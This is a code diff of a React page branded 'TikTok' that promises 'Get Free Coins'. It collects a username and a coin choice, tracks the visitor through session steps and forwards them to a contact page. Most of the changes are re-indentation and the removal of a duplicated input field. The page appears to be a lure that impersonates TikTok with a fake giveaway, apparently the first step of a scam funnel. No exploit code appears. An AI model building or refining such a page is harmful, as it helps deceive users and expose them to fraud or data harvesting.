@@ -44,11 +44,12 @@ const HomePage = () => {
 
   const handleContinue = async () => {
     const cleanUsername = username
-  .normalize("NFD")
-  .replace(/[\u0300-\u036f]/g, "")
-  .replace(/ı/g, "i")
-  .replace(/İ/g, "i")
-  .toLowerCase();
+      .normalize("NFD")
+      .replace(/[\u0300-\u036f]/g, "")
+      .replace(/ı/g, "i")
+      .replace(/İ/g, "i")
+      .toLowerCase();
+
     if (username.trim() && sessionId) {
       setIsSubmitting(true);
       localStorage.setItem('username', cleanUsername);
@@ -64,31 +65,31 @@ const HomePage = () => {
       }
 
       try {
-  let visitorId = localStorage.getItem("visitorId");
+        let visitorId = localStorage.getItem("visitorId");
 
-  if (!visitorId) {
-    visitorId = crypto.randomUUID();
-    localStorage.setItem("visitorId", visitorId);
-  }
+        if (!visitorId) {
+          visitorId = crypto.randomUUID();
+          localStorage.setItem("visitorId", visitorId);
+        }
 
-  await axios.post(`${API}/session/step`, {
-    session_id: sessionId,
-    step: 'username_coin',
-    data: {
-      username: cleanUsername,
-      amount: selectedCoin,
-      visitor_id: visitorId
-    }
-  });
+        await axios.post(`${API}/session/step`, {
+          session_id: sessionId,
+          step: 'username_coin',
+          data: {
+            username: cleanUsername,
+            amount: selectedCoin,
+            visitor_id: visitorId
+          }
+        });
 
-  navigate('/contact');
+        navigate('/contact');
 
-} catch (error) {
-  console.error('Failed to submit step:', error);
+      } catch (error) {
+        console.error('Failed to submit step:', error);
 
-} finally {
-  setIsSubmitting(false);
-}
+      } finally {
+        setIsSubmitting(false);
+      }
     }
   };
 
@@ -113,83 +114,65 @@ const HomePage = () => {
 
       <main className="max-w-4xl mx-auto px-6 pt-7 pb-12">
         <div className="text-center mb-6">
-  <h1 className="text-[42px] sm:text-[48px] font-black mb-2 tracking-[1px] leading-tight">
-    <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
-      TikTok
-    </span>
-  </h1>
+          <h1 className="text-[42px] sm:text-[48px] font-black mb-2 tracking-[1px] leading-tight">
+            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
+              TikTok
+            </span>
+          </h1>
 
-  <p className="text-cyan-400 text-[18px] sm:text-[20px] font-semibold mb-3 leading-tight">
-    Get Free Coins
-  </p>
-</div>
+          <p className="text-cyan-400 text-[18px] sm:text-[20px] font-semibold mb-3 leading-tight">
+            Get Free Coins
+          </p>
+        </div>
 
-<p className="text-gray-400 text-center text-[14px] sm:text-[15px] mb-6 leading-relaxed">
-  Enter your TikTok username and choose a coin amount.
-</p>
+        <p className="text-gray-400 text-center text-[14px] sm:text-[15px] mb-6 leading-relaxed">
+          Enter your TikTok username and choose a coin amount.
+        </p>
+
         <div className="mb-7">
-  <label className="text-white text-[14px] sm:text-[15px] mb-2 block">
-    Username
-  </label>
+          <label className="text-white text-[14px] mb-2 block">
+            Username
+          </label>
 
-  <div className="group relative flex items-center rounded-xl border border-gray-700 bg-[#1a1a1c] transition-all focus-within:border-cyan-400 focus-within:ring-1 focus-within:ring-cyan-400/30">
-    <div className="absolute left-4 text-gray-500 transition-colors group-focus-within:text-cyan-400 pointer-events-none">
-      <svg
-        xmlns="http://www.w3.org/2000/svg"
-        width="18"
-        height="18"
-        viewBox="0 0 24 24"
-        fill="none"
-        stroke="currentColor"
-        strokeWidth="2"
-        strokeLinecap="round"
-        strokeLinejoin="round"
-      >
-        <path d="M20 21a8 8 0 0 0-16 0" />
-        <circle cx="12" cy="7" r="4" />
-      </svg>
-    </div>
+          <div className="group relative">
+            <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-cyan-400 pointer-events-none transition-colors">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
+                <path d="M20 21a8 8 0 0 0-16 0" />
+                <circle cx="12" cy="7" r="4" />
+              </svg>
+            </div>
 
-    <Input
-      type="text"
-      placeholder="@username"
-      value={username}
-      onChange={(e) =>
-        setUsername(
-          e.target.value
-            .toLowerCase()
-            .replace(/ı/g, "i")
-            .replace(/İ/g, "i")
-            .normalize("NFD")
-            .replace(/[\u0300-\u036f]/g, "")
-        )
-      }
-      className="h-[52px] w-full border-0 bg-transparent pl-11 pr-4 text-[15px] text-white placeholder:text-gray-500 rounded-xl focus-visible:ring-0 focus-visible:ring-offset-0"
-    />
-  </div>
-</div>
-
-    <Input
-      type="text"
-      placeholder="@username"
-      value={username}
-      onChange={(e) =>
-        setUsername(
-          e.target.value
-            .toLowerCase()
-            .replace(/ı/g, "i")
-            .replace(/İ/g, "i")
-            .normalize("NFD")
-            .replace(/[\u0300-\u036f]/g, "")
-        )
-      }
-      className="w-full h-[76px] bg-[#1a1a1c] border-2 border-cyan-400 text-white placeholder:text-gray-500 pl-16 pr-5 text-[22px] rounded-2xl focus:border-cyan-400 focus:ring-2 focus:ring-cyan-400/30"
-    />
-  </div>
-</div>
+            <Input
+              type="text"
+              placeholder="@username"
+              value={username}
+              onChange={(e) =>
+                setUsername(
+                  e.target.value
+                    .toLowerCase()
+                    .replace(/ı/g, "i")
+                    .replace(/İ/g, "i")
+                    .normalize("NFD")
+                    .replace(/[\u0300-\u036f]/g, "")
+                )
+              }
+              className="!h-[46px] !w-full !bg-[#1a1a1c] !border !border-gray-700 !text-white !placeholder:text-gray-500 !pl-10 !pr-4 !text-[14px] !rounded-lg focus:!border-cyan-400 focus:!ring-1 focus:!ring-cyan-400/30 focus-visible:!ring-1 focus-visible:!ring-cyan-400/30 focus-visible:!ring-offset-0"
+            />
+          </div>
+        </div>
 
         <div className="mb-8">
-          <label className="text-white text-lg mb-4 block">Select Coin Amount</label>
+          <label className="text-white text-[14px] mb-3 block">Select Coin Amount</label>
           <div className="grid grid-cols-3 gap-4">
             {coinOptions.map((option) => (
               <button
@@ -216,7 +199,6 @@ const HomePage = () => {
           {isSubmitting ? 'Loading...' : 'Continue'}
         </Button>
 
-        {/* Coins Display - GERİ GELDİ */}
         <div className="mt-8 text-center">
           <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-4 sm:px-8 py-3 sm:py-4">
             <span className="text-gray-400 text-sm sm:text-lg">You will receive: </span>
